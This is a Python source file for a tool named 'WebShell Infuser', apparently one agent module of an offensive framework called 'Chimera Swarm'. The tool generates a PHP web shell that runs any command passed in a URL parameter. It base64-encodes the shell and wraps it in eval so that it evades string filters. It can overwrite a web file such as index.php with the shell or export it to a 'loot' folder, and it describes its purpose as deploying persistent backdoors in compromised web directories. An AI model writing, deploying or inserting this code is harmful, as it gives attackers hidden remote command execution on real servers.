import os
import sys
import base64

class WebShellInfuser:
    """
    Chimera Agent 110: WebShell Infuser
    Purpose: Deploy obfuscated persistent backdoors via compromised web dirs.
    """
    def __init__(self):
        self.agent_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        # Standard PHP Webshell (Base64 Encoded to evade basic string filters)
        self.raw_shell = "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"
        self.encoded_shell = base64.b64encode(self.raw_shell.encode()).decode()

    def generate_obfuscated_php(self):
        """Wraps the shell in a secondary layer of PHP execution logic."""
        return f"<?php eval(base64_decode('{self.encoded_shell}')); ?>"

    def deploy_locally(self, path="/var/www/html/index.php"):
        """Deploys to a local web directory for testing (Requires Sudo)."""
        print(f"[*] Agent 110: Attempting infusion at {path}...")
        try:
            payload = self.generate_obfuscated_php()
            with open(path, 'w') as f:
                f.write(payload)
            print(f"[!!!] Agent 110: INFUSION SUCCESSFUL. Access via: http://target/index.php?cmd=id")
        except PermissionError:
            print("[!] Agent 110 Error: Access Denied. Run with sudo for local infusion.")
        except Exception as e:
            print(f"[!] Agent 110 Error: {e}")

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 110 :: WEBSHELL INFUSER :: CHIMERA SWARM")
        print("="*60)
        print("1. Generate Obfuscated PHP Stager")
        print("2. Local Infusion (Test on Kali /var/www/html)")
        print("3. Manual Export (Save payload to loot)")
        print("0. Return to Commander")
        
        choice = input("\nSelect Action > ")
        
        if choice == "1":
            print(f"\n[STAGER]:\n{self.generate_obfuscated_php()}\n")
        elif choice == "2":
            target_path = input("Enter full path to web file (e.g. /var/www/html/shell.php): ")
            self.deploy_locally(target_path)
        elif choice == "3":
            out_path = os.path.join(self.agent_root, "loot", "stager.php")
            with open(out_path, 'w') as f:
                f.write(self.generate_obfuscated_php())
            print(f"[+] Stager exported to {out_path}")
        elif choice == "0":
            sys.exit(0)

if __name__ == "__main__":
    infuser = WebShellInfuser()
    infuser.menu()
